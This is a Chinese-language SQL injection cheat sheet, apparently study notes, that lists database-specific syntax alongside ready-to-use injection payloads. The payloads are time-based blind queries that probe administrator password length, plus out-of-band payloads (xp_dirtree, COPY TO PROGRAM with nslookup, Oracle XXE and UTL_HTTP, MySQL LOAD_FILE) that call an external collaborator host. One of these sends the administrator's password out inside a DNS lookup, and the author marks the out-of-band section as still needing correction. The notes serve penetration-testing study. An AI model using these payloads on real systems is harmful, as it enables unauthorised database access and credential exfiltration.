# SQL 速查表

SQL 语言的一些核心功能在流行的数据库平台中以相同的方式实现，因此许多检测和利用 SQL 注入漏洞的方法在不同类型的数据库上工作方式相同。

然而，常见数据库之间也存在许多差异。这意味着某些检测和利用 SQL 注入的技术在不同平台上工作方式不同。例如：

- 字符串连接语法。
- 注释。
- 批量（或堆叠）查询。
- 平台特定的 API。
- 错误消息。

速查表
- [invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)

- [portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 字符串连接

- PostgreSQL
    `'字符串a' || '字符串b'`
- MySql
    `'字符串a' '字符串b'` 或 `'字符串a' || '字符串b'`
- Microsoft SQL Server
    `'字符串a' + '字符串b'`
- Oracle
    `'字符串a' || '字符串b'`

## 组字符串聚合

- PostgreSQL
    ```sql
    STRING_AGG(列字符串表达式, 分隔符)
    ```
- Oracle
    ```sql
    LISTAGG(列字符串表达式, 分隔符) WITHIN GROUP (ORDER BY 0)
    ```

## 行数限制

普通 `LIMIT`

- Oracle
    `ROWNUM`

## 查询数据库结构

```sql
SELECT schema_name FROM information_schema.schemata
```

除普遍支持的表 `information_schema` 外的特有元数据表

- PostgreSQL

    - 数据库名
        ```sql
        SELECT nspname FROM pg_catalog.pg_namespace
        ```

- Oracle（用户 <=> 数据库）
    - 当前用户名
        ```sql
        SELECT username FROM user_users
        ```
    - 当前用户可见的所有用户
        ```sql
        SELECT username FROM ALL_USERS
        ```
    - 当前用户可访问的表（列）名
        ```sql
        SELECT table_name FROM ALL_TABLES;
        SELECT table_name, column_name FROM ALL_TAB_COLUMNS;
        ```
    - 当前用户的表（列）名
        ```sql
        SELECT table_name FROM user_tables;
        SELECT table_name, column_name FROM user_tab_columns;
        ```

## 版本

- MySql：
    `version()` 或 `@@version`
- Microsoft SQL Server：
    `@@version`
- Oracle：
    ```sql
    SELECT BANNER FROM v$version
    ```
- PostgreSQL：
    `version()`


## SELECT

- Oracle
    ```sql
    SELECT x FROM DUAL
    ```
    - `SELECT` 后必须接表名


## 注释

- MySQL
    `-- ` 或 `#`
    - 双横杠符号后需接空格

## 条件错误

- Oracle
    ```sql
    SELECT CASE WHEN (条件语句) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
    ```

## 字符串子串

- Oracle 	
    `SUBSTR('foobar', 4, 2)`
- Microsoft 	
    `SUBSTRING('foobar', 4, 2)`
- PostgreSQL 	
    `SUBSTRING('foobar', 4, 2)`
- MySQL 	
    `SUBSTRING('foobar', 4, 2) `

## 延迟响应

- MySQL
    `SELECT SLEEP(10)` 和 `BENCHMARK()`
- MSSQL
    `WAITFOR DELAY '0:0:10'`
- PostgreSQL
    `SELECT pg_sleep(10) -> VOID`
- Oracle
    `UTL_HTTP`
    `dbms_pipe.receive_message(('a'),10)`

## 条件延迟响应

- Oracle 	
    ```sql
    SELECT CASE WHEN (条件语句) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
    ```
- Microsoft 	
    ```sql
    IF (条件语句) WAITFOR DELAY '0:0:10'
    ```
- PostgreSQL 	
    ```sql
    SELECT CASE WHEN (条件语句) THEN pg_sleep(10) ELSE pg_sleep(0) END
    ```
- MySQL 	
    ```sql
    SELECT IF(条件语句,SLEEP(10),'a') 
    ```

## 带外 ⚠ 待修正 ⚠

- Microsoft
    ```sql
    -- 语句
    $input=''; exec master..xp_dirtree '//id.oastify.com/a' --
    ```

- PostgreSQL
    ```sql
    -- 语句
    $input=''; COPY (SELECT '') to program 'nslookup id.oastify.com' --
    ```

- Oracle

    ```sql
    -- 子查询，确认
    $input='' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://id.oastify.com/"> %remote;]>'),'/l') FROM dual) --

    -- 子查询，确认
    $input='' || (SELECT UTL_INADDR.get_host_address('id.oastify.com') FROM dual)--

    -- 函数
    $input='' || UTL_HTTP.request('https://id.oastify.com/')--
    ```


- MySQL

    ```sql
    -- 函数
    $input='' AND LOAD_FILE('\\\\id.oastify.com\\a')-- 

    -- 语句
    $input=''; SELECT 'foo' INTO OUTFILE '\\\\id.oastify.com\\a'-- 
    ```

## 带外数据转储

- Oracle

    ```sql
    $input='' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.id.oastify.com/"> %remote;]>'),'/l') FROM dual) --
    ```

## 注意

- 如 SUBSTR 或 LENTH 等函数，在参数1设置动态查询时，需额外一层双括号以设置参数位置为值，而不是语句（核心为将完整子查询结果作为函数参数，与对动态查询列应用函数）

    ```sql
    -- SELECT 返回查询结果字符串后，应用 LENGTH 计算长度
    LENGTH((SELECT password FROM users WHERE username = 'administrator')) >= 0

    -- 动态查询时 LENGTH 计算列字符串长度后，由 SELECT 返回作为整数作为查询结果
    (SELECT LENGTH(password) FROM users WHERE username = 'administrator') >= 0    
    ```

    ```sql
    -- 子查询结果作为条件
    SELECT 
    CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')>1) 
    THEN pg_sleep(2) 
    ELSE pg_sleep(0) 
    END

    -- 对动态查询的应用条件
    SELECT 
        CASE WHEN (username='administrator' AND LENGTH(password)>1) 
        THEN pg_sleep(2) 
        ELSE pg_sleep(0) 
        END 
    FROM users
    ```


- 函数返回值为 NULL 时的各种上下文

    PostgreSQL

    ```sql
    -- 作为 FROM 的函数调用
    $input = 'x' AND 1=(SELECT 1 FROM pg_sleep(3)) -- 

    -- 隐式类型转换
    $input = 'x' || pg_sleep(3) --
    $input = 'x' || (SELECT pg_sleep(3)) --

    -- 新语句
    $input = 'x'; SELECT pg_sleep(3) -- 
    ```

- 似乎**语句**无法添加外括号且应当在顶层，而函数/子查询作为**表达式**有时应当添加外括号

- 使用 `LIKE '*admin*'` 宽泛搜索可能的目标